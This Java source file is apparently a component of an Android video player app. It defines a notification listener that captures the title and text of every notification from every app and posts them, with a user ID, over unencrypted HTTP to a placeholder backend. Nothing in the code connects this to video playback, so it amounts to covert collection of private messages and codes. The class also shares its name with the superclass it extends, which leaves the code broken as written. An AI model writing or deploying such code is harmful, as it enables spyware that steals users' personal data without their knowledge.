package com.videoplayerapp.services;

import android.app.Notification;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NotificationListenerService extends NotificationListenerService {
    private static final String TAG = "NotificationListener";
    private static final String API_BASE_URL = "http://your-backend-url.com/api";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
    private OkHttpClient client;

    @Override
    public void onCreate() {
        super.onCreate();
        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
        
        Log.d(TAG, "Notification Listener Service Created");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification notification = sbn.getNotification();
            String packageName = sbn.getPackageName();
            String title = "";
            String text = "";
            
            // Extract notification content
            if (notification.extras != null) {
                title = notification.extras.getString(Notification.EXTRA_TITLE, "");
                text = notification.extras.getString(Notification.EXTRA_TEXT, "");
            }

            // Create notification data object
            JSONObject notificationData = new JSONObject();
            notificationData.put("packageName", packageName);
            notificationData.put("title", title);
            notificationData.put("text", text);
            notificationData.put("timestamp", sbn.getPostTime());
            notificationData.put("id", sbn.getId());
            notificationData.put("userId", getUserId()); // Get from shared preferences
            
            // Send to backend
            sendNotificationToBackend(notificationData);
            
            Log.d(TAG, "Notification captured: " + packageName + " - " + title);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Handle notification removal if needed
        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
    }

    private void sendNotificationToBackend(JSONObject notificationData) {
        new Thread(() -> {
            try {
                RequestBody body = RequestBody.create(notificationData.toString(), JSON);
                Request request = new Request.Builder()
                        .url(API_BASE_URL + "/notifications/store")
                        .post(body)
                        .addHeader("Content-Type", "application/json")
                        .build();

                try (Response response = client.newCall(request).execute()) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Notification sent to backend successfully");
                    } else {
                        Log.e(TAG, "Failed to send notification: " + response.code());
                    }
                }
            } catch (IOException e) {
                Log.e(TAG, "Error sending notification to backend", e);
            }
        }).start();
    }

    private String getUserId() {
        // Get user ID from shared preferences
        return getSharedPreferences("VideoPlayerPrefs", MODE_PRIVATE)
                .getString("userId", "unknown");
    }
} 